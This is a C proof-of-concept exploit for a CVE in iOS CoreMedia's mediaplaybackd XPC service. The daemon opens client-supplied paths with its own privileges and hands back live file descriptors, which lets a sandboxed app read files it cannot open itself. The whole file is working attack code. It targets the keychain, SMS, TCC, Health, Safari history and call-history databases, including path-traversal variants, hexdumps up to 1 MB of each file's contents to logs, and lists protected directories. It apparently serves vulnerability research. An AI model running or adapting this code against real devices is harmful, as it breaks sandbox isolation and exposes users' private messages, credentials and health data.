/*
 * probe_fdleak.c — CVE-2026-112706: CoreMedia mediaplaybackd bytestream XPC, fd vend.
 *
 * mediaplaybackd opens a client-supplied file:// path with ITS OWN privileges and returns
 * a live fd in ByteStreamDetails.FileDescriptor. I/O on that descriptor bypasses the
 * client's sandbox path checks -> a file the app cannot open() becomes readable.
 *
 * Handshake: '.rp1' -> '.rp2' (memory recipient) -> '.org' (memory origin), then a
 * 'Curl' create with CreationURL. Everything via dlsym: CoreMedia (Fig*) + libxpc.
 *
 * Output: syslog + <HOME>/Documents/probe_fdleak.log
 */

/* uint types — avoid size_t conflict with SDK headers */
typedef unsigned char uint8_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef long long int64_t;
typedef int int32_t;
typedef unsigned long long size_t;
typedef void *xpc_object_t;
typedef void *CFURLRef;
typedef void *CFAllocatorRef;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern int open(const char *, int, ...);
extern int close(int);
extern long pread(int, void *, unsigned long, long long);
extern int fstat(int, void *);
extern char *getenv(const char *);
extern int *__error(void);
extern void syslog(int, const char *, ...);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_join(void *, void **);
extern void free(void *);
extern int unlink(const char *);
extern void *malloc(size_t);
extern void free(void *);
extern void *fdopendir(int);
extern void *readdir(void *);
extern int closedir(void *);
extern unsigned long long mach_absolute_time(void);
extern int mkdir(const char *, unsigned int);

#define NULL ((void *)0)
#define RTLD_NOW 2
#define RTLD_DEFAULT ((void *)-2)
#define O_RDONLY 0x0000
#define O_WRONLY 0x0001
#define O_CREAT 0x0200
#define O_APPEND 0x0008   /* Darwin: O_NONBLOCK=0x4 */

/* Fig* ABI (from FdLeak.swift / Cinder27) */
typedef int32_t (*fn_basic_msg)(uint32_t, uint64_t, void **);
typedef int32_t (*fn_origin_begin)(void *);
typedef int32_t (*fn_origin_complete)(void *, void **);
typedef int32_t (*fn_recipient)(void *, void *, const char *, void **);
typedef int32_t (*fn_set_cfurl)(void *, const char *, CFURLRef);

/* libxpc ABI */
typedef void *(*fn_conn_create)(const char *, void *, uint64_t);
typedef void (*fn_resume)(void *);
typedef void *(*fn_send_sync)(void *, void *);
typedef void *(*fn_dict_get_value)(void *, const char *);
typedef uint64_t (*fn_dict_get_u64)(void *, const char *);
typedef void (*fn_dict_set_u64)(void *, const char *, uint64_t);
typedef int32_t (*fn_dict_dup_fd)(void *, const char *);
typedef int64_t (*fn_dict_get_i64)(void *, const char *);
typedef void (*fn_release)(void *);
typedef const char *(*fn_copy_description)(void *);
typedef void *(*fn_get_type)(void *);
typedef const char *(*fn_type_get_name)(void *);
typedef int32_t (*fn_pipe_create)(void *, uint64_t *);
typedef void    (*fn_set_event_handler)(void *, void *);
typedef void    (*fn_send_with_reply)(void *, void *, void *, void *);
typedef void   *(*fn_retain)(void *);

typedef void *dispatch_semaphore_t;
extern dispatch_semaphore_t dispatch_semaphore_create(long);
extern long dispatch_semaphore_wait(dispatch_semaphore_t, unsigned long long);
extern long dispatch_semaphore_signal(dispatch_semaphore_t);
extern void dispatch_release(void *);

#define DISPATCH_TIME_NOW 0ull
#define SIX_SECONDS_NS 6000000000ull

/* CoreFoundation */
typedef CFURLRef (*fn_cfurl_create_fs)(CFAllocatorRef, const uint8_t *, long, int);

static fn_basic_msg          p_basic_msg;
static fn_origin_begin       p_origin_begin;
static fn_origin_complete    p_origin_complete;
static fn_recipient          p_recipient;
static fn_set_cfurl          p_set_cfurl;
static fn_conn_create        p_conn_create;
static fn_resume             p_resume;
static fn_send_sync          p_send_sync;
static fn_dict_get_value     p_dict_get_value;
static fn_dict_get_u64       p_dict_get_u64;
static fn_dict_set_u64       p_dict_set_u64;
static fn_dict_dup_fd        p_dict_dup_fd;
static fn_dict_get_i64       p_dict_get_i64;
static fn_release            p_release;
static fn_copy_description   p_copy_description;
static fn_type_get_name      p_type_get_name;
static fn_get_type           p_get_type;
static fn_cfurl_create_fs    p_cfurl;
static fn_set_event_handler  p_set_event_handler;
static fn_send_with_reply    p_send_with_reply;
static fn_retain             p_retain;

static char g_log[600];

static void report(const char *fmt, ...) {
    char buf[900];
    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);
    int n = __builtin_vsnprintf(buf, sizeof(buf), fmt, ap);
    __builtin_va_end(ap);
    if (n <= 0) return;
    if (n > (int)sizeof(buf) - 1) n = (int)sizeof(buf) - 1;
    syslog(1, "%s", buf);
    int fd = open(g_log, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd >= 0) {
        extern long write(int, const void *, unsigned long);
        write(fd, buf, (unsigned long)n);
        write(fd, "\n", 1);
        close(fd);
    }
}

/* ---------------- bind ---------------- */
static int bind_all(void) {
    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW);
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
    void *rt = RTLD_DEFAULT;
    if (!cm || !cf) { report("fdleak: dlopen CoreMedia=%p CF=%p", cm, cf); return 0; }

    p_basic_msg       = (fn_basic_msg)dlsym(cm, "FigXPCCreateBasicMessage");
    p_origin_begin    = (fn_origin_begin)dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
    p_origin_complete = (fn_origin_complete)dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
    p_recipient       = (fn_recipient)dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
    p_set_cfurl       = (fn_set_cfurl)dlsym(cm, "FigXPCMessageSetCFURL");

    p_conn_create   = (fn_conn_create)dlsym(rt, "xpc_connection_create_mach_service");
    p_resume        = (fn_resume)dlsym(rt, "xpc_connection_resume");
    p_send_sync     = (fn_send_sync)dlsym(rt, "xpc_connection_send_message_with_reply_sync");
    p_dict_get_value= (fn_dict_get_value)dlsym(rt, "xpc_dictionary_get_value");
    p_dict_get_u64  = (fn_dict_get_u64)dlsym(rt, "xpc_dictionary_get_uint64");
    p_dict_set_u64  = (fn_dict_set_u64)dlsym(rt, "xpc_dictionary_set_uint64");
    p_dict_dup_fd   = (fn_dict_dup_fd)dlsym(rt, "xpc_dictionary_dup_fd");
    p_dict_get_i64  = (fn_dict_get_i64)dlsym(rt, "xpc_dictionary_get_int64");
    p_release       = (fn_release)dlsym(rt, "xpc_release");
    p_copy_description = (fn_copy_description)dlsym(rt, "xpc_copy_description");
    p_type_get_name = (fn_type_get_name)dlsym(rt, "xpc_type_get_name");
    p_get_type      = (fn_get_type)dlsym(rt, "xpc_get_type");
    p_cfurl         = (fn_cfurl_create_fs)dlsym(cf, "CFURLCreateFromFileSystemRepresentation");
    p_set_event_handler = (fn_set_event_handler)dlsym(rt, "xpc_connection_set_event_handler");
    p_send_with_reply   = (fn_send_with_reply)dlsym(rt, "xpc_connection_send_message_with_reply");
    p_retain            = (fn_retain)dlsym(rt, "xpc_retain");

    if (!p_basic_msg || !p_origin_begin || !p_origin_complete || !p_recipient || !p_set_cfurl ||
        !p_conn_create || !p_resume || !p_send_sync || !p_dict_get_value || !p_dict_dup_fd ||
        !p_cfurl) {
        report("fdleak: dlsym fail basic=%p begin=%p comp=%p recip=%p url=%p conn=%p send=%p dupfd=%p cfurl=%p",
               (void*)p_basic_msg, (void*)p_origin_begin, (void*)p_origin_complete, (void*)p_recipient,
               (void*)p_set_cfurl, (void*)p_conn_create, (void*)p_send_sync, (void*)p_dict_dup_fd, (void*)p_cfurl);
        return 0;
    }
    return 1;
}

static const char *type_name(void *o) {
    if (!o || !p_get_type || !p_type_get_name) return "?";
    void *t = p_get_type(o);
    const char *n = p_type_get_name(t);
    return n ? n : "?";
}

static volatile int g_reply_flag;
static void *g_reply_obj;

static void *send_msg(void *conn, void *msg) {
    if (!msg) return NULL;
    /* the synchronous variant is safe now: the run happens on its own thread */
    if (p_send_sync) {
        void *reply = p_send_sync(conn, msg);
        if (reply) return reply;
    }
    if (!p_send_with_reply) return NULL;
    g_reply_obj = NULL;
    g_reply_flag = 0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    void (^handler)(void *) = ^(void *obj) {
        if (obj) {
            const char *tn = type_name(obj);
            if (tn && (tn[0] == 'd' || (tn[0] == 'e' && tn[1] == 'r'))) {
                if (p_retain) p_retain(obj);
                g_reply_obj = obj;
            }
            g_reply_flag = 1;
        }
        dispatch_semaphore_signal(sem);
    };
    p_send_with_reply(conn, msg, NULL, (void *)handler);
    if (dispatch_semaphore_wait(sem, SIX_SECONDS_NS) != 0) {
        report("fdleak: reply timeout (no answer in 6s)");
        return NULL;
    }
    return g_reply_obj;
}

/* ---------------- handshake ---------------- */
static int g_established = 0;
static char g_hs[256];

static void handshake(void *conn) {
    char *log = g_hs;
    int p = 0;

    /* '.rp1' */
    void *m1 = NULL;
    int32_t st = p_basic_msg(0x2E727031, 0, &m1);
    if (st == 0 && m1) {
        void *r1 = send_msg(conn, m1);
        p_release(m1);
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp1:%s ", type_name(r1));
        if (r1 && type_name(r1)[0] == 'd') {
            /* '.rp2' + memory recipient */
            void *m2 = NULL;
            if (p_basic_msg(0x2E727032, 0, &m2) == 0 && m2) {
                void *recip = NULL;
                int32_t cr = p_recipient(r1, m2, "kc27probe", &recip);
                void *r2 = send_msg(conn, m2);
                p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp2(recip=%d):%s ", cr, type_name(r2));
                if (r2) p_release(r2);
                p_release(m2);
            }
            p_release(r1);
        } else if (r1) {
            p_release(r1);
        }
    } else {
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "rp1-fail st=%d ", st);
    }

    /* '.org' — memory origin; cp == 0 => established */
    void *om = NULL;
    if (p_basic_msg(0x2E6F7267, 0, &om) == 0 && om) {
        int32_t bg = p_origin_begin(om);
        void *or_ = send_msg(conn, om);
        p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "org(begin=%d):%s ", bg, type_name(or_));
        if (or_) {
            if (type_name(or_)[0] == 'd') {
                void *origin = NULL;
                int32_t cp = p_origin_complete(or_, &origin);
                g_established = (cp == 0);
                p += __builtin_snprintf(log + p, 250 - (unsigned long)p, "complete=%d est=%d", cp, g_established);
            }
            p_release(or_);
        }
        p_release(om);
    }
    log[p] = 0;
}

/* ---------------- vend ---------------- */
typedef struct {
    int ok;
    int fd;
    uint64_t object_id, entire_length, server_pid;
    int64_t error_code;
    long long size;
    uint32_t mode;
    int is_dir;
} vend_t;

static vend_t vend(void *conn, const char *path) {
    vend_t v;
    uint8_t *raw = (uint8_t *)&v;
    for (unsigned i = 0; i < sizeof(v); i++) raw[i] = 0;
    v.fd = -1;

    CFURLRef url = p_cfurl(NULL, (const uint8_t *)path, (long)__builtin_strlen(path), 0);
    if (!url) { v.error_code = -999; return v; }

    void *m = NULL;
    if (p_basic_msg(0x4375726C, 0, &m) != 0 || !m) { v.error_code = -998; return v; }
    p_set_cfurl(m, "CreationURL", url);
    if (p_dict_set_u64) p_dict_set_u64(m, "FileOpenOptions", 0);

    void *reply = send_msg(conn, m);
    p_release(m);

    if (!reply) { v.error_code = -997; return v; }
    if (type_name(reply)[0] != 'd') { v.error_code = -996; p_release(reply); return v; }

    void *details = p_dict_get_value(reply, "ByteStreamDetails");
    if (!details) {
        v.error_code = p_dict_get_i64 ? p_dict_get_i64(reply, ".ErrorReturn") : -995;
        p_release(reply);
        return v;
    }

    v.object_id = p_dict_get_u64(details, "ObjectID");
    v.entire_length = p_dict_get_u64(details, "EntireLength");
    v.server_pid = p_dict_get_u64(details, "ServerPID");

    int fd = p_dict_dup_fd(details, "FileDescriptor");
    p_release(reply);
    if (fd < 0) { v.error_code = -994; return v; }

    /* fstat without headers: only st_mode (offset 4) and st_size (offset 104 on arm64 Darwin) */
    uint8_t stbuf[256];
    for (unsigned i = 0; i < sizeof(stbuf); i++) stbuf[i] = 0;
    if (fstat(fd, stbuf) == 0) {
        uint32_t mode = *(uint32_t *)(stbuf + 4);
        long long size = *(long long *)(stbuf + 104);
        v.mode = mode;
        v.size = size;
        v.is_dir = ((mode & 0170000) == 0040000);
    }
    v.fd = fd;
    v.ok = 1;
    return v;
}

/* ---------------- targets ---------------- */
typedef struct { const char *label; const char *path; int expect_ok; } target_t;

static const target_t g_targets[] = {
    {"MediaLibrary.sqlitedb", "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb", 1},
    {"PlayCounts.plist",      "/private/var/mobile/Media/iTunes_Control/iTunes/PlayCounts.plist", 1},
    {"iTunes_dir",            "/private/var/mobile/Media/iTunes_Control/iTunes", 1},
    {"SMS/sms.db",            "/private/var/mobile/Library/SMS/sms.db", 0},
    {"keychain-2.db",         "/private/var/Keychains/keychain-2.db", 0},
    {"TCC.db",                "/private/var/mobile/Library/TCC/TCC.db", 0},
    {"TRAV keychain",         "/private/var/mobile/Media/iTunes_Control/iTunes/../../../../Keychains/keychain-2.db", 0},
    {"TRAV TCC (3up)",        "/private/var/mobile/Media/iTunes_Control/iTunes/../../../Library/TCC/TCC.db", 0},
    {"TRAV sms (3up)",        "/private/var/mobile/Media/iTunes_Control/iTunes/../../../Library/SMS/sms.db", 0},
    {"TRAV Library (3up)",    "/private/var/mobile/Media/iTunes_Control/iTunes/../../../Library", 0},
    {"TRAV AppContainer",     "/private/var/mobile/Media/iTunes_Control/iTunes/../../Containers/Data/Application", 0},
    {"SystemVersion.plist",   "/System/Library/CoreServices/SystemVersion.plist", 0},
    {"Health/healthdb_secure.sqlite", "/private/var/mobile/Library/Health/healthdb_secure.sqlite", 0},
    {"Safari/History.db",     "/private/var/mobile/Library/Safari/History.db", 0},
    {"Preferences/.GlobalPreferences.plist", "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist", 0},
    {"CallHistory.storedata", "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata", 0},
};

static int g_rc = 1;

static void *probe_thread(void *arg) {
    (void)arg;
    const char *home = getenv("HOME");
    unsigned long i = 0;
    while (home && home[i] && i < 400) { g_log[i] = home[i]; i++; }
    const char *sfx = "/Documents/probe_fdleak.log";
    for (unsigned long k = 0; sfx[k]; k++) g_log[i++] = sfx[k];
    g_log[i] = 0;
    unlink(g_log);   /* we clear our own log: house_arrest rm is unreliable */

    report("fdleak: start t=%llu", mach_absolute_time());
    if (!bind_all()) { report("fdleak: bind failed"); g_rc = 1; return NULL; }

    void *conn = p_conn_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    report("fdleak: connection=%p", conn);
    if (!conn) { report("fdleak: no connection"); g_rc = 1; return NULL; }
    if (p_set_event_handler) {
        void (^eh)(void *) = ^(void *obj) {
            if (!obj) { report("fdleak: conn event nil"); return; }
            const char *tn = type_name(obj);
            report("fdleak: conn event type=%s", tn ? tn : "?");
        };
        p_set_event_handler(conn, (void *)eh);
    }
    p_resume(conn);

    handshake(conn);
    report("fdleak: handshake %s established=%d", g_hs, g_established);

    int vended = 0, denied = 0, bytes = 0;
    char act[300];

    for (unsigned t = 0; t < sizeof(g_targets) / sizeof(g_targets[0]); t++) {
        const target_t *tg = &g_targets[t];

        /* control: our own open() must be refused */
        int e = 0;
        int cfd = open(tg->path, O_RDONLY, 0);
        if (cfd >= 0) { close(cfd); e = 0; } else { e = *__error(); }

        vend_t v = vend(conn, tg->path);
        if (v.ok) {
            vended++;
            long long sz = v.size > 0 ? v.size : (long long)v.entire_length;
            long long take = sz > 1048576 ? 1048576 : sz;
            uint8_t *head = malloc((size_t)take);
            long got = 0;
            if (!v.is_dir && take > 0) got = pread(v.fd, head, (unsigned long)take, 0);
            if (got > 0) bytes += (int)got;

            char hex[512];
            int hp = 0;
            for (long k = 0; k < got && k < 64; k++)
                hp += __builtin_snprintf(hex + hp, sizeof(hex) - (unsigned long)hp, "%02x", head[k]);
            hex[hp] = 0;

            report("%s: VENDED fd=%d size=%lld mode=0%o dir=%d obj=%llu pid=%llu direct_open_errno=%d",
                   tg->label, v.fd, sz, v.mode, v.is_dir, (unsigned long long)v.object_id,
                   (unsigned long long)v.server_pid, e);
            if (got > 0 && !v.is_dir) {
                report("===== %s (%ld B) =====", tg->label, (long)got);
                for (long off = 0; off < got; off += 16) {
                    char hex[80] = {0}, asc[40] = {0};
                    int hp = 0, ap = 0;
                    for (int k = 0; k < 16 && off + k < got; k++) {
                        unsigned char c = head[off + k];
                        hp += __builtin_snprintf(hex + hp, sizeof(hex) - (unsigned long)hp, "%02x ", c);
                        ap += __builtin_snprintf(asc + ap, sizeof(asc) - (unsigned long)ap, "%c", (c >= 32 && c < 127) ? c : '.');
                    }
                    report("%08lx: %-48s | %s", (unsigned long)off, hex, asc);
                }
                report("===== end %s =====", tg->label);
            }
            free(head);
            close(v.fd);
        } else {
            if (v.error_code == -12203) denied++;
            report("%s: refused code=%lld direct_open_errno=%d", tg->label,
                   (long long)v.error_code, e);
        }
    }

    /* directory listing through the vended fd */
    static const char *dirs[] = {
        "/private/var/mobile/Media",
        "/private/var/mobile/Library",
        "/private/var/mobile/Library/TCC",
        "/private/var/mobile/Containers/Data/Application",
        "/System/Library/CoreServices",
        "/private/var/mobile/Media/iTunes_Control/iTunes",
    };
    for (unsigned di = 0; di < sizeof(dirs) / sizeof(dirs[0]); di++) {
        vend_t v = vend(conn, dirs[di]);
        if (!v.ok) { report("DIR %s: refused code=%lld", dirs[di], (long long)v.error_code); continue; }
        if (!v.is_dir) { report("DIR %s: not a directory", dirs[di]); close(v.fd); continue; }
        void *dp = fdopendir(v.fd);
        if (!dp) { report("DIR %s: fdopendir failed", dirs[di]); close(v.fd); continue; }
        int n = 0;
        char names[200];
        int np = 0;
        void *de;
        while ((de = readdir(dp)) != NULL) {
            char *nm = (char *)de + 10;   /* Darwin arm64 dirent: d_name @ +10 */
            if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
            n++;
            if (n <= 10 && np < 170) {
                for (int k = 0; nm[k] && np < 180; k++) names[np++] = nm[k];
                names[np++] = ' ';
            }
        }
        names[np] = 0;
        report("DIR %s: %d entries | %s", dirs[di], n, names);
        closedir(dp);
    }

    __builtin_snprintf(act, sizeof(act), "vended=%d denied=%d bytes_read=%d est=%d",
                       vended, denied, bytes, g_established);
    report("METRIC|L_s1_fdleak_xsandbox|fd for file we cannot open()|%s|%s",
           act, (vended > 0) ? "ESCAPE" : "BLOCKED");
    report("fdleak: done");
    p_release(conn);
    g_rc = (vended > 0) ? 2 : 0;
    return NULL;
}

int main(void) {
    void *th = 0;
    if (pthread_create(&th, NULL, probe_thread, NULL) != 0) return 1;
    pthread_join(th, NULL);
    return g_rc;
}